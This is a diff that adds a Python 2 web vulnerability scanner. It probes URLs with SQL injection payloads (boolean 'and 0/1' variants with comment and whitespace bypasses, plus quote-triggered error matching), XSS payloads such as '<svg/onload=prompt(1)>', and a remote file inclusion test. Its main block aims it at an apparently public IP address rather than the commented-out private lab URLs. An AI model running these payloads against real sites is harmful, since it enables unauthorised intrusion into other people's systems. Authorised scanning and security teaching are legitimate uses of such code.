@@ -1,0 +1,376 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# author = w8ay
+import sys
+reload(sys)
+sys.setdefaultencoding("utf-8")
+
+import requests
+import urlparse
+from urllib import quote as urlencode
+from urllib import unquote as urldecode
+import md5
+import sys
+import re
+import urlparse
+import threading
+import dbms as dbms
+from config import *
+from colorprinter import *
+
+reload(sys)
+sys.setdefaultencoding( "utf-8" )
+
+PROXY = {
+  "http": "http://127.0.0.1:1080"
+}
+
+
+COOKIE = {}
+
+vul_file = open('vulfile.txt','w')
+
+def md5_encrypt(str):  
+	m = md5.new()   
+	m.update(str)   
+	return m.hexdigest()  
+
+class vul_module(threading.Thread):
+
+	def __init__(self,url,logfile):
+		threading.Thread.__init__(self)
+		self.url = url
+		self.testurl = ''
+		self.sql_errors = []
+		self.logfile = logfile
+		self.output = ColorPrinter()
+
+	def Integer_sqlinj_scan(self):
+
+		try:
+			res_md5_1 = md5_encrypt(requests.get(url=self.url,headers=HEADER).text)
+			res_md5_2 = md5_encrypt(requests.get(url=self.url+urlencode('+1'),headers=HEADER).text)
+			res_md5_3 = md5_encrypt(requests.get(url=self.url+urlencode('+1-1'),headers=HEADER).text)
+		except Exception,e:
+			print e
+			res_md5_1 = res_md5_2 = res_md5_3 = 0
+			pass
+
+		if ( res_md5_1 == res_md5_3 ) and res_md5_1 != res_md5_2:
+			return 1
+		return 0
+
+								
+	def Str_sqlinj_scan(self):
+		quotes = ['\'' , '"','']
+		payload_0 = [" and 0;-- ","/**/and/**/0;#","\tand\t0;#","\nand/**/0;#"]
+		payload_1 = [" and 1;-- ","/**/and/**/1;#","\tand\t1;#","\nand/**/1;#"]
+
+		for i in quotes:
+			for j in range(len(payload_0)):
+				p0 = i + payload_0[j]
+				p1 = i + payload_1[j]
+				try:
+					res_md5_1 = md5_encrypt(requests.get(url=self.url,headers=HEADER).text)
+					res_md5_2 = md5_encrypt(requests.get(url=self.url+urlencode(p0),headers=HEADER).text)
+					res_md5_3 = md5_encrypt(requests.get(url=self.url+urlencode(p1),headers=HEADER).text)
+				except Exception,e:
+					print e
+					res_md5_1 = res_md5_2 = res_md5_3 = 0
+					pass
+				if ( res_md5_1 == res_md5_3 ) and res_md5_1 != res_md5_2:
+					return 1
+		return 0
+
+	def Sql_error_scan(self):
+		'''
+		This method searches for SQL errors in html's.
+		
+		@parameter response: The HTTP response object
+		@return: A list of errors found on the page
+		'''
+		r1 = requests.get(url=self.url,headers=HEADER)
+		r2 = requests.get(url=self.url+urlencode('\''),headers=HEADER)
+
+		res = []
+		for sql_regex, dbms_type in self.Get_sql_errors():
+			match1 = sql_regex.search(r1.text)
+			match2 = sql_regex.search(r2.text)
+			if  match2 and not match1 :
+				msg = 'A SQL error was found in the response supplied by the web application,'
+				msg += match2.group(0)  + '". The error was found '
+				#res.append( (sql_regex, match.group(0), dbms_type) )
+				return 1
+		return 0
+
+
+	def Xss_scan(self):
+		TEST_PAYLOAD = ['rivirfortest']
+		XSS_PAYLOAD	= [
+			'<script>confirm(1)</script>',
+			'<scr<script>ipt>alert(1)</scr<script>ipt>',
+			'<svg/onload=prompt(1)>',
+			'" onfocus=alert(1) autofocus x="'
+		]
+
+		for test in XSS_PAYLOAD:
+			self.testurl = self.url+urlencode(test)
+			r = requests.get(url=self.testurl,headers=HEADER)
+			#if ( 'alert(1)' or 'prompt(1)' or 'confirm(1)' ) in r.text:
+			if test in r.text:
+				return 1
+		for test in TEST_PAYLOAD:
+			self.testurl = self.url+urlencode(test)
+			r = requests.get(url=self.testurl,headers=HEADER)
+			if test in r.text:
+				self.output.print_yellow_text(get_ctime() + '\t' + self.testurl + " => OUTPUT Point(maybe xss)")
+		return 0
+		
+	def FileInclude_scan(self):
+		#http://192.168.87.143/fileincl/example1.php?page=intro.php
+		#如上，要把参数替换成我们想要的,?page=intro.php替换为page=http://www.baidu.com
+		#把全部参数都替换成了payload
+		RFI_PAYLOAD = [
+			"http://www.baidu.com"
+		]
+		url = urlparse.urlparse(self.url)
+		url_query = url.query
+		url_query_tmp = []
+		if not url_query:
+			return 0
+		for i in url_query.split('&'):
+			i_tmp = i.replace(i.split('=')[1],RFI_PAYLOAD[0])
+			url_query_tmp = url_query
+			url_query_tmp = url_query_tmp.replace(i,i_tmp)
+			url_tmp = urlparse.urlunparse( urlparse.ParseResult(url.scheme,url.netloc,url.path,url.params,url_query_tmp,url.fragment) )
+			r = requests.get(url=url_tmp,headers=HEADER)
+			if  "tieba.baidu.com" in r.text:
+				return 1
+		return 0
+		
+	def Get_sql_errors(self):
+		
+		if len(self.sql_errors) != 0:
+			return self.sql_errors
+			
+		else:
+			errors = []
+			
+			# ASP / MSSQL
+			errors.append( ('System\.Data\.OleDb\.OleDbException', dbms.MSSQL ) )
+			errors.append( ('\\[SQL Server\\]', dbms.MSSQL ) )
+			errors.append( ('\\[Microsoft\\]\\[ODBC SQL Server Driver\\]', dbms.MSSQL ) )
+			errors.append( ('\\[SQLServer JDBC Driver\\]', dbms.MSSQL ) )
+			errors.append( ('\\[SqlException', dbms.MSSQL ) )
+			errors.append( ('System.Data.SqlClient.SqlException', dbms.MSSQL ) )
+			errors.append( ('Unclosed quotation mark after the character string', dbms.MSSQL ) )
+			errors.append( ("'80040e14'", dbms.MSSQL ) )
+			errors.append( ('mssql_query\\(\\)', dbms.MSSQL ) )
+			errors.append( ('odbc_exec\\(\\)', dbms.MSSQL ) )
+			errors.append( ('Microsoft OLE DB Provider for ODBC Drivers', dbms.MSSQL ))
+			errors.append( ('Microsoft OLE DB Provider for SQL Server', dbms.MSSQL ))
+			errors.append( ('Incorrect syntax near', dbms.MSSQL ) )
+			errors.append( ('Sintaxis incorrecta cerca de', dbms.MSSQL ) )
+			errors.append( ('Syntax error in string in query expression', dbms.MSSQL ) )
+			errors.append( ('ADODB\\.Field \\(0x800A0BCD\\)<br>', dbms.MSSQL ) )
+			errors.append( ("Procedure '[^']+' requires parameter '[^']+'", dbms.MSSQL ))
+			errors.append( ("ADODB\\.Recordset'", dbms.MSSQL ))
+			errors.append( ("Unclosed quotation mark before the character string", dbms.MSSQL ))
+			
+			# DB2
+			errors.append( ('SQLCODE', dbms.DB2 ) )
+			errors.append( ('DB2 SQL error:', dbms.DB2 ) )
+			errors.append( ('SQLSTATE', dbms.DB2 ) )
+			errors.append( ('\\[IBM\\]\\[CLI Driver\\]\\[DB2/6000\\]', dbms.DB2 ) )
+			errors.append( ('\\[CLI Driver\\]', dbms.DB2 ) )
+			errors.append( ('\\[DB2/6000\\]', dbms.DB2 ) )
+			
+			# Sybase
+			errors.append( ("Sybase message:", dbms.SYBASE ) )
+			
+			# Access
+			errors.append( ('Syntax error in query expression', dbms.ACCESS ))
+			errors.append( ('Data type mismatch in criteria expression.', dbms.ACCESS ))
+			errors.append( ('Microsoft JET Database Engine', dbms.ACCESS ))
+			errors.append( ('\\[Microsoft\\]\\[ODBC Microsoft Access Driver\\]', dbms.ACCESS ) )
+			
+			# ORACLE
+			errors.append( ('(PLS|ORA)-[0-9][0-9][0-9][0-9]', dbms.ORACLE ) )
+			
+			# POSTGRE
+			errors.append( ('PostgreSQL query failed:', dbms.POSTGRE ) )
+			errors.append( ('supplied argument is not a valid PostgreSQL result', dbms.POSTGRE ) )
+			errors.append( ('pg_query\\(\\) \\[:', dbms.POSTGRE ) )
+			errors.append( ('pg_exec\\(\\) \\[:', dbms.POSTGRE ) )
+			
+			# MYSQL
+			errors.append( ('supplied argument is not a valid MySQL', dbms.MYSQL ) )
+			errors.append( ('Column count doesn\'t match value count at row', dbms.MYSQL ) )
+			errors.append( ('mysql_fetch_array\\(\\)', dbms.MYSQL ) )
+			errors.append( ('mysql_', dbms.MYSQL ) )
+			errors.append( ('on MySQL result index', dbms.MYSQL ) )
+			errors.append( ('You have an error in your SQL syntax;', dbms.MYSQL ) )
+			errors.append( ('You have an error in your SQL syntax near', dbms.MYSQL ) )
+			errors.append( ('MySQL server version for the right syntax to use', dbms.MYSQL ) )
+			errors.append( ('\\[MySQL\\]\\[ODBC', dbms.MYSQL ))
+			errors.append( ("Column count doesn't match", dbms.MYSQL ))
+			errors.append( ("the used select statements have different number of columns", dbms.MYSQL ))
+			errors.append( ("Table '[^']+' doesn't exist", dbms.MYSQL ))
+
+			
+			# Informix
+			errors.append( ('com\\.informix\\.jdbc', dbms.INFORMIX ))
+			errors.append( ('Dynamic Page Generation Error:', dbms.INFORMIX ))
+			errors.append( ('An illegal character has been found in the statement', dbms.INFORMIX ))
+			
+			errors.append( ('<b>Warning</b>:  ibase_', dbms.INTERBASE ))
+			errors.append( ('Dynamic SQL Error', dbms.INTERBASE ))
+			
+			# DML
+			errors.append( ('\\[DM_QUERY_E_SYNTAX\\]', dbms.DMLDATABASE ))
+			errors.append( ('has occurred in the vicinity of:', dbms.DMLDATABASE ))
+			errors.append( ('A Parser Error \\(syntax error\\)', dbms.DMLDATABASE ))
+			
+			# Java
+			errors.append( ('java\\.sql\\.SQLException', dbms.JAVA ))
+			errors.append( ('Unexpected end of command in statement', dbms.JAVA ))
+
+			# Coldfusion
+			errors.append( ('\\[Macromedia\\]\\[SQLServer JDBC Driver\\]', dbms.MSSQL ))
+			
+			# Generic errors..
+			errors.append( ('SELECT .*? FROM .*?', dbms.UNKNOWN ))
+			errors.append( ('UPDATE .*? SET .*?', dbms.UNKNOWN ))
+			errors.append( ('INSERT INTO .*?', dbms.UNKNOWN ))
+			errors.append( ('Unknown column', dbms.UNKNOWN ))
+			errors.append( ('where clause', dbms.UNKNOWN ))
+			errors.append( ('SqlServer', dbms.UNKNOWN ))
+			
+			#  compile them and save that into self.sql_errors. 
+			for re_string, dbms_type in errors:
+				self.sql_errors.append( (re.compile(re_string, re.IGNORECASE ), dbms_type) )
+		
+		return self.sql_errors
+
+	def check(self,module):
+		global vul_file
+		url_struct = urlparse.urlparse(self.url)
+		if url_struct.query != '':
+			if module == 'all':
+				self.run()
+			if module == 'sql':
+				if self.Integer_sqlinj_scan() or self.Str_sqlinj_scan() or self.Sql_error_scan():
+					self.output.print_green_text(get_ctime() + '\t' + self.url + "=> SQL injection!")
+					self.logfile.write(get_ctime() + '\t' + self.url + "=> SQL injection!" + '\n')
+					self.logfile.flush()
+
+					vul_file.write(self.url + '\t' + "SQL injection!" + '\n')
+					vul_file.flush()
+			if module == 'xss':
+				if self.Xss_scan():
+					self.output.print_green_text(get_ctime() + '\t' + self.testurl + " => XSS!")
+					self.logfile.write(get_ctime() + '\t' + self.testurl + " => XSS!" + '\n')
+					self.logfile.flush()
+
+					vul_file.write(self.url + '\t' + "XSS!" + '\n')
+					vul_file.flush()
+			if module == 'rfi':
+				if self.FileInclude_scan():
+					self.output.print_green_text(get_ctime() + '\t' + self.url + " => RFI!")
+					self.logfile.write(get_ctime() + '\t' + self.url + " => RFI!" + '\n')
+					self.logfile.flush()
+
+					vul_file.write(self.url + '\t' + "RFI!" + '\n')
+					vul_file.flush()
+
+
+
+	def run(self):
+		#待添加具体url匹配哪个漏洞
+		print "[+] %s\t%s" % (get_ctime(),self.url)
+		if self.Integer_sqlinj_scan():
+			self.output.print_green_text(get_ctime() + '\t' + self.url + " => Integer SQL injection!" + '\n')
+			self.logfile.write(get_ctime() + '\t' + self.url + " => Integer SQL injection!" + '\n')
+			self.logfile.flush()
+			vul_file.write(self.url + '\t' + "Integer SQL injection!" + '\n')
+			vul_file.flush()
+		elif self.Str_sqlinj_scan():
+			self.output.print_green_text(get_ctime() + '\t' + self.url + " => String SQL injection!" + '\n')
+			self.logfile.write(get_ctime() + '\t' + self.url + " => String SQL injection!" + '\n')
+			self.logfile.flush()
+			vul_file.write(self.url + '\t' + "String SQL injection!" + '\n')
+			vul_file.flush()
+		elif self.Sql_error_scan():
+			self.output.print_green_text(get_ctime() + '\t' + self.url + "=> SQL error injection!" + '\n')
+			self.logfile.write(get_ctime() + '\t' + self.url + "=> SQL error injection!" + '\n')
+			self.logfile.flush()
+			vul_file.write(self.url + '\t' + "SQL error injection!" + '\n')
+			vul_file.flush()
+		elif self.Xss_scan():
+			self.output.print_green_text(get_ctime() + '\t' + self.testurl + " => XSS vulnerabe!" + '\n')
+			self.logfile.write(get_ctime() + '\t' + self.url + " => XSS vulnerabe!" + '\n')
+			self.logfile.flush()
+			vul_file.write(self.url + '\t' + "XSS vulnerabe!" + '\n')
+			vul_file.flush()
+		elif self.FileInclude_scan():
+			self.output.print_green_text(get_ctime() + '\t' + self.url + " => RFI vulnerabe!" + '\n')
+			self.logfile.write(get_ctime() + '\t' + self.url + " => RFI vulnerabe!" + '\n')
+			self.logfile.flush()
+			vul_file.write(self.url + '\t' + "RFI vulnerabe!" + '\n')
+			vul_file.flush()
+		else:
+			self.output.print_blue_text(" /** above links is no vulnerabe **/")
+			self.logfile.write(get_ctime() + '\t' + self.url + " => safe" + '\n')
+			self.logfile.flush()
+
+if __name__ == '__main__':
+	
+	logfile = open('logfile.txt','a')
+	
+
+	url = "http://121.41.128.239:8098/stkj/index.php/product/safety_wire?t=7"
+	self = vul_module(url,logfile)
+	self.start()
+
+	'''
+	url = "http://192.168.8.131/sqli/example1.php?name=root"
+	self = vul_module(url,logfile)
+	self.start()
+
+	url = "http://192.168.8.131/sqli/example2.php?name=root"
+	self = vul_module(url,logfile)
+	self.start()
+
+	url = "http://192.168.8.131/sqli/example3.php?name=root"
+	self = vul_module(url,logfile)
+	self.start()
+
+	
+	url = "http://192.168.8.131/sqli/example4.php?id=2"
+	self = vul_module(url,logfile)
+	self.start()
+
+	
+
+	url = "http://192.168.8.131/sqli/example5.php?id=2"
+	self = vul_module(url,logfile)
+	self.start()
+
+	url = "http://192.168.8.131/sqli/example6.php?id=2"
+	self = vul_module(url,logfile)
+	self.start()
+
+	
+
+	url = "http://192.168.8.131/sqli/example7.php?id=2"
+	self = vul_module(url,logfile)
+	self.start()
+
+	url = "http://192.168.8.131/sqli/example8.php?order=name"
+	self = vul_module(url,logfile)
+	self.start()
+
+	url = "http://192.168.8.131/sqli/example9.php?order=name"
+	self = vul_module(url,logfile)
+	self.start()
+	'''
